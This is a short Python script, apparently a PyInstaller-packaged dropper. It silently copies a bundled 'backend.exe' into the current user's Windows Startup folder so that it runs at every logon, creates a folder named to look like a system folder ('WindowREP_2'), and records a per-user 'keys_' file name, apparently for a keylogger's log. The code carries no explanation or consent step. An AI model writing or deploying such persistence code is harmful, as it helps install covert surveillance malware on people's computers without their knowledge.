import os
import shutil
import sys
import random

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)




def deploy_utility():
    source = resource_path("ext\\backend.exe")
    destination = os.path.expanduser(
        "~")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    store_path = os.path.expanduser(
        "~") + "\\AppData\\local\\WindowREP_2"
    os.makedirs(store_path)
    file_name = "keys_" + \
        os.path.expanduser("~").split(
            "\\")[-1] + "_" + str(random.randint(1, 1_000_000))
    with open(store_path+"\\stats.txt", 'w') as file:
        file.write(file_name)

    shutil.copy(source, destination)




if __name__ == '__main__':
    deploy_utility()
